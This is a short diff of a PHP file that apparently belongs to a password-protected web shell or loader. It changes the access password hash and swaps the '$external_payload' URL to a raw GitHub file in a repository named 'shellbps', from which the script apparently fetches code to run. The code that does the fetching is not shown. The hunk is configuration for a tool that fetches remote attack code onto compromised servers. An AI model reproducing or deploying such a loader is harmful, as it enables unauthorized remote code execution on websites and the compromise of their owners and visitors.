@@ -4,8 +4,8 @@ session_start();
 /**
  * KONFIGURASI
  */
-$valid_password_hash = '92211ceaf37e0ca0f239e6efc6d89bc6'; 
-$external_payload = 'https://7dewa.pages.dev/ah.txt';
+$valid_password_hash = '0e46934e49241e706bbf5fbea87773d6'; 
+$external_payload = 'https://raw.githubusercontent.com/hagan1337/shellbps/refs/heads/main/ah.txt';
 $logo_url = 'https://g.top4top.io/p_36674k04q0.png';
 
 /**
